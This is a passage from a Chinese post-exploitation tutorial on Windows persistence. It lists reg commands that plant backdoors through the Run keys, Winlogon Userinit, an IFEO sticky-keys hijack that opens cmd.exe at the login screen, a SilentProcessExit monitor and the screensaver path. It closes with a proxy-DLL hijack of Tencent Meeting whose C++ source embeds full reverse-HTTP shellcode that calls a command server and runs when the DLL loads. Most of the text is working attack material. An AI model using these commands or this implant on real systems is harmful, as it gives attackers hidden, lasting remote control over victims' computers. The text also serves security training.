HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\currentversion\Runonce
```

![image-20241012161255376](https://image.201068.xyz/assets/38.后渗透/image-20241012161255376.png)

![image-20241012161315660](https://image.201068.xyz/assets/38.后渗透/image-20241012161315660.png)

![image-20241012161348944](https://image.201068.xyz/assets/38.后渗透/image-20241012161348944.png)

![image-20241012161401376](https://image.201068.xyz/assets/38.后渗透/image-20241012161401376.png)

#### 添加注册表运行键

执行以下命令，在注册表运行键中添加一个名为“`houmen`”的键，并将键值指向后门程序的绝对路径

```python
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V houmen /t REG_SZ /d "C:\Users\Administrator\Desktop\6666.exe"

#删除
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V houmen /F
```

![image-20241012161448948](https://image.201068.xyz/assets/38.后渗透/image-20241012161448948.png)

![image-20241012161520555](https://image.201068.xyz/assets/38.后渗透/image-20241012161520555.png)

#### 重启计算机上线

![image-20241012161612280](https://image.201068.xyz/assets/38.后渗透/image-20241012161612280.png)

![image-20241012161737199](https://image.201068.xyz/assets/38.后渗透/image-20241012161737199.png)

### 4.3.Winlogon Helper

Winlogon 是 Windows 系统的组件，用于**处理与用户有关的各种行为**，

如登录.注销.在登录时加载用户配置文件.锁定屏幕等。

这些行为由系统注册表管理，注册表中的一些键值定义了在 Windows 登录期间会启动哪些进程。

我们可以修改此类注册表键值，使 `Winlogon` 在**用户登录时执行恶意程序**，以此建立持久化后门。

#### 常见的两个

```python
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon

#指定用户登录时执行的用户初始化程序，默认为 explorer.exe
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon\Shell

#指定Windows身份验证期间执行的程序，默认为 userinit.exe
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
```

![image-20241012161930224](https://image.201068.xyz/assets/38.后渗透/image-20241012161930224.png)

#### 在`Userinit` 键添加个后门序程

执行以下命令，在`Userinit` 键中添加个后门序程，程序将在**用户登录时启动**。

```python
shell reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\System32\userinit.exe,6666.exe" /f

#恢复
shell reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\System32\userinit.exe" /f
```

在修改 `Userinit` 和 `Shell` 键时**需要保留键值中的原有程**序，将**要启动的后门程序添加到原有程序后面**，并以“`,`”进行分隔。

并且，**后门程序需要被上传至** `C:\Windows\System32` 目录。

![image-20241012163146494](https://image.201068.xyz/assets/38.后渗透/image-20241012163146494.png)

#### 注销并进行用户登录

![image-20241012163313127](https://image.201068.xyz/assets/38.后渗透/image-20241012163313127.png)

![image-20241012163349494](https://image.201068.xyz/assets/38.后渗透/image-20241012163349494.png)

## 5.IFEO注入(映像劫持)

 `IFEO`(`Image File Execution Options`)是Windows系统的一个注册表项，路径为

```python
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

在 Windows 系统中，IFEO 原本是为一些**在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定**。

IFEO 使开发人员能够将**调试器附加到应用程序**。

当进程创建时，应用程序的 IFEO 中设置的调试器将附加到应用程序的名称前，从而有效地在调试器下启动新进程。

![image-20241012164835675](https://image.201068.xyz/assets/38.后渗透/image-20241012164835675.png)

### 5.1.Dubugger

当用户启动计算机的程序后，系统会在注册表的 IFEO 中查询所有的程序子键，

如果存在与该程序名称相同的子健，就读取对应子键的 “`Dubugger`” 键值。

如果该键值未被设置，就默认不做处理，否则**直接用该键值所指定的程序路径来代替原始的程序**。

#### 创建粘滞键后门

通过编辑 “`Dubugger`” 的值，可以通过修改注册表的方式**创建粘滞键后门**。

在目标主机上执行以下命令，向`Image File Execution Options`注册表项中**添加映像劫持子键**，并将“`Dubugger`”的值设置为要执行的程序即可。

```python
shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"

#恢复
shell reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /F
```

![image-20241012165250467](https://image.201068.xyz/assets/38.后渗透/image-20241012165250467.png)

![image-20241012165401961](https://image.201068.xyz/assets/38.后渗透/image-20241012165401961.png)

#### 触发粘滞键

##### 按5次shift

![image-20241012165502169](https://image.201068.xyz/assets/38.后渗透/image-20241012165502169.png)

##### 登录界面按5次shift

![image-20241012165626367](https://image.201068.xyz/assets/38.后渗透/image-20241012165626367.png)

### 5.2.GlobaFlag

  IFEO还可以在指定程序**静默退出时启动任意监控程序**，需要通过设置以下3个注册表来实现。

```python
#启用对记事本进程的静默退出监视
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512

#表示当 notepad.exe 进程退出时，通过调试器进行报告
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1

#将监视器进程设为 6666.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /V Monitorprocess /d "C:\Windows\System32\6666.exe"

#删除
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /F
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /F
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /V Monitorprocess /F
```

![image-20241012165926176](https://image.201068.xyz/assets/38.后渗透/image-20241012165926176.png)

![image-20241012170024451](https://image.201068.xyz/assets/38.后渗透/image-20241012170024451.png)

![image-20241012170102854](https://image.201068.xyz/assets/38.后渗透/image-20241012170102854.png)

#### 记事本退出

![image-20241012170405441](https://image.201068.xyz/assets/38.后渗透/image-20241012170405441.png)

![image-20241012170352400](https://image.201068.xyz/assets/38.后渗透/image-20241012170352400.png)

## 6.利用屏幕保护程序

 屏幕保护是Windows系统的一项功能，可以在用户一段时间**不活动后播放屏幕消息或图形动画**。

屏幕保护程序由具有 `.scr` 文件扩展名的可执行文件组成。

系统注册表项 `HKEY_CURRENT_USER\Control Panel\Desktop` 下存储了用来设置屏幕保护程序的键值。

| 键名                | 说明                                                       |
| ------------------- | ---------------------------------------------------------- |
| SCRNSAVE.EXE        | 设置屏幕保护程序的路径，其指向以 .scr 为扩展名的可执行文件 |
| ScreenSaveActive    | 设置是否启用屏幕保护程序，默认为 1 表示启用                |
| ScreenSaverIsSecure | 设置是否需要密码解锁，设为 0 表示不需要密码                |
| ScreenSaveTimeOut   | 设置执行屏幕保护程序之前用户不活动的超时时间               |

#### 修改屏幕保护程序的执行路径

攻击者可以通过**编辑注册表**，**修改屏幕保护程序的执行路径**（即`scrnsave.exe`键的值），

当**触发屏幕保护**时执行自定义的后门程序，以此实现持久化，具体命令如下。

```python
#将触发屏幕保护时执行的程序设为自定义的恶意程序，这里的程序以.scr或.exe为扩展名皆可
shell reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Users\h\Desktop\6666.exe"

#启用屏幕保护
shell reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /V ScreenSaveActive /t REG_SZ /d 1 /F

#设置不需要密码解锁
shell reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0" /F

#将用户不活动的超时设为60秒
shell reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d "5" /F

#删除
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /F
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /V ScreenSaveActive /F
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /F
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /F
```
![image-20241012174903716](https://image.201068.xyz/assets/38.后渗透/image-20241012174903716.png)

![image-20241012175216521](https://image.201068.xyz/assets/38.后渗透/image-20241012175216521.png)

#### 等待进入屏幕保护程序

注销账户后登录，等待5s

![image-20241012211330558](https://image.201068.xyz/assets/38.后渗透/image-20241012211330558.png)

![image-20241012175820898](https://image.201068.xyz/assets/38.后渗透/image-20241012175820898.png)

## 7.利用 dll 劫持权限维持

 对系统中的软件进行 **dll 劫持**也可达到权限维持的效果，

#### 程序复制到空目录

首先将要劫持的应用程序复制一份到一个空目录当中

https://meeting.tencent.com/download/

![image-20241012213143749](https://image.201068.xyz/assets/38.后渗透/image-20241012213143749.png)

##### 安装腾讯会议

![image-20241012214532286](https://image.201068.xyz/assets/38.后渗透/image-20241012214532286.png)

##### 启动程序放出空白目录

![image-20241012214659318](https://image.201068.xyz/assets/38.后渗透/image-20241012214659318.png)

#### ProcessMonitor 监控程序

利用 `ProcessMonitor` 开启对该程序的监控，

![image-20241012214916584](https://image.201068.xyz/assets/38.后渗透/image-20241012214916584.png)

开启监控后**执行**空目录当中的**软件**，通过 `ProcessMonitor` 查看**进程加载 dll 的情况**，

找到**不在 `Knowndlls` 中的 dll 文件**，

![image-20241012215042550](https://image.201068.xyz/assets/38.后渗透/image-20241012215042550.png)

![image-20241012215411255](https://image.201068.xyz/assets/38.后渗透/image-20241012215411255.png)

#### AheadLib生成 cpp 代码

然后使用 `AheadLib` 生成 cpp 代码。

![image-20241012215725482](https://image.201068.xyz/assets/38.后渗透/image-20241012215725482.png)

![image-20241012215638163](https://image.201068.xyz/assets/38.后渗透/image-20241012215638163.png)

![image-20241012215817880](https://image.201068.xyz/assets/38.后渗透/image-20241012215817880.png)

#### 新建 `dll` 项目

使用 `vs` 新建 `dll` 项目，

![image-20241012215935749](https://image.201068.xyz/assets/38.后渗透/image-20241012215935749.png)

将生成的 cpp 源码粘贴到 vs 中，对代码稍作修改，使其能够运行 shellcode 

![image-20241012220029443](https://image.201068.xyz/assets/38.后渗透/image-20241012220029443.png)

#### 编译成 dll 文件

##### 生成shellcode

![image-20241012222134888](https://image.201068.xyz/assets/38.后渗透/image-20241012222134888.png)

![image-20241012222235814](https://image.201068.xyz/assets/38.后渗透/image-20241012222235814.png)

![image-20241012220921602](https://image.201068.xyz/assets/38.后渗透/image-20241012220921602.png)

![image-20241012222336127](https://image.201068.xyz/assets/38.后渗透/image-20241012222336127.png)

##### 然后将其编译成 dll 文件

```python
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 头文件
#include <Windows.h>
#include "pch.h"
#include <stdlib.h>


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/// 将导出函数复制到下面
#pragma comment(linker, "/EXPORT:GetFileVersionInfoA=versionOrg.GetFileVersionInfoA,@1")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoByHandle=versionOrg.GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoExA=versionOrg.GetFileVersionInfoExA,@3")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoExW=versionOrg.GetFileVersionInfoExW,@4")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeA=versionOrg.GetFileVersionInfoSizeA,@5")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeExA=versionOrg.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeExW=versionOrg.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeW=versionOrg.GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoW=versionOrg.GetFileVersionInfoW,@9")
#pragma comment(linker, "/EXPORT:VerFindFileA=versionOrg.VerFindFileA,@10")
#pragma comment(linker, "/EXPORT:VerFindFileW=versionOrg.VerFindFileW,@11")
#pragma comment(linker, "/EXPORT:VerInstallFileA=versionOrg.VerInstallFileA,@12")
#pragma comment(linker, "/EXPORT:VerInstallFileW=versionOrg.VerInstallFileW,@13")
#pragma comment(linker, "/EXPORT:VerLanguageNameA=versionOrg.VerLanguageNameA,@14")
#pragma comment(linker, "/EXPORT:VerLanguageNameW=versionOrg.VerLanguageNameW,@15")
#pragma comment(linker, "/EXPORT:VerQueryValueA=versionOrg.VerQueryValueA,@16")
#pragma comment(linker, "/EXPORT:VerQueryValueW=versionOrg.VerQueryValueW,@17")


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// 定义一个名为 DoMagic 的 WINAPI 函数，返回类型为 DWORD，接收一个 LPCVOID 类型的参数  
DWORD WINAPI DoMagic(LPCVOID lpParameter) {
	// 定义一个unsigned char数组，存储shellcode
	unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x0a\x1a\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4b\x4d\x51\x74\x00\xf2\x15\x7c\xe0\x92\xdc\x14\xa3\xa5\x8c\xc7\x2d\x19\xb9\x12\x80\x13\x7c\x09\x39\x26\xf7\x46\xca\x9f\x70\x94\xcb\xa6\x76\xf0\x0e\x63\x9d\x90\xc1\x87\xda\xf7\x77\x11\x60\x42\xcf\x92\xf5\x95\x26\x96\x07\x4f\xb5\xcb\x85\x8e\x53\x5b\xc2\x15\x64\x46\x4a\xf1\xee\xbe\x19\xce\x57\x2a\x68\x78\x03\x83\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x4c\x43\x29\x0d\x0a\x00\x9a\x60\x11\xa4\x00\x71\xb6\x59\x9d\x96\x9f\x13\x53\xa4\x49\x03\x12\x8d\x94\x54\x7f\x8d\x4e\xb3\xbf\x5f\x71\x2e\x24\xb2\xda\x84\x8b\x43\xd9\x2c\x06\x1a\x90\xba\xd3\x03\x46\x4a\xb5\x4b\x4e\x04\xe3\x8d\x83\x72\x47\x86\x08\xd1\x7a\x4d\x82\xe7\xac\x03\xc6\xf0\xd1\xd0\x50\x0e\xba\xb6\x31\x80\x83\xba\xa2\x18\xd8\xc0\x56\xe6\x7f\xa2\x6e\xb0\x6a\xc3\xe3\xfb\xea\x54\x64\x02\x0b\xac\xd1\xb6\x8c\x1b\x11\x90\xa6\x07\x1e\x17\xfe\x60\xe8\x6c\xb1\x00\xe5\x90\xe1\x07\x51\x7e\xa5\xcc\x87\xf2\x3a\xdf\x80\x4f\xb2\x90\xe6\x7a\xcf\xdb\x12\x27\x03\x67\x28\x75\xcf\xba\x5a\x25\xa7\x74\xd5\xf3\x95\xa8\x37\x01\xe1\xce\x73\x2d\x20\xf5\x8b\x37\xa5\xd5\xdf\xa5\x9f\x00\x35\xf5\x57\x37\x5c\x59\x75\x84\x5e\xe0\xf6\x2e\x06\xc3\xcb\xfe\xf6\x99\x28\x19\x61\x8a\x54\x3f\x1f\x41\xb1\x20\x78\xc1\x3e\x13\xd7\x2f\x48\x42\x6a\xc9\xa0\x7a\x22\x16\x50\x77\x99\xbd\xef\x63\x12\x7d\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x37\x30\x2e\x34\x00\x17\x50\x65\xea";
	// 使用 VirtualAlloc 函数在虚拟内存中分配空间，大小为 shellcode 的大小，  MEM_COMMIT 表示立即分配物理内存，PAGE_EXECUTE_READWRITE 表示该内存区域可以执行读写操作 
	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	// 使用memcpy函数将shellcode复制到刚刚分配的内存区域中
	memcpy(exec, shellcode, sizeof shellcode);
	// 将exec强制类型转换为函数指针，并调用该函数（即执行shellcode）
	((void(*)())exec)();
	// 函数返回 0，表示成功执行
	return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// DLL的入口函数，当DLL被加载或卸载时，系统会自动调用此函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
	// 判断DLL被加载的原因，DLL_PROCESS_ATTACH 表示DLL被加载到进程中
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		// 禁用DLL_THREAD_ATTACH和DLL_THREAD_DETACH通知，以提高性能
		DisableThreadLibraryCalls(hModule);
		// 创建一个新线程，该线程执行DoMagic函数
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DoMagic, 0, 0, 0);
		// 检查线程句柄是否有效，即线程是否成功创建
		if (hThread)
		{
			// 如果线程句柄有效，则关闭句柄。这样做是为了防止句柄泄露。闭句柄并不意味着终止线程，线程将继续运行。
			CloseHandle(hThread);
		}
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
	}

	return TRUE;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

```

![image-20241012222911835](https://image.201068.xyz/assets/38.后渗透/image-20241012222911835.png)

![image-20241012222839534](https://image.201068.xyz/assets/38.后渗透/image-20241012222839534.png)

![image-20241012223325018](https://image.201068.xyz/assets/38.后渗透/image-20241012223325018.png)

![image-20241012223251794](https://image.201068.xyz/assets/38.后渗透/image-20241012223251794.png)

#### 重命名文件名

编译完成后将其放到空白目录的正常应用程序所在目录，并重命名为被劫持的 **dll 的文件名**，

将**正常 dll 文件**重命名为`AheadLib` 中的**原始文件名称**，

![image-20241012223405312](https://image.201068.xyz/assets/38.后渗透/image-20241012223405312.png)

#### 运行应用程序

当应用程序运行时 cs 即可收到会话。

![image-20241012223444863](https://image.201068.xyz/assets/38.后渗透/image-20241012223444863.png)

![image-20241012223548805](https://image.201068.xyz/assets/38.后渗透/image-20241012223548805.png)

#### 防御系统的 dll 被劫持

Windows 7之后：微软为了更进一步的防御系统的 dll 被劫持，

将一些容易被劫持的系统 dll **写进了一个注册表项**中，

那么凡是此项下的 dll 文件就会**被禁止从﻿EXE﻿自身所在的目录下调用**，而**只能从系统目录即 dll 目录下调用**。

`KnownDLLs` 列表，注册表查询如下：

```bash
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
```

![image-20241012151951852](https://image.201068.xyz/assets/38.后渗透/image-20241012151951852.png)

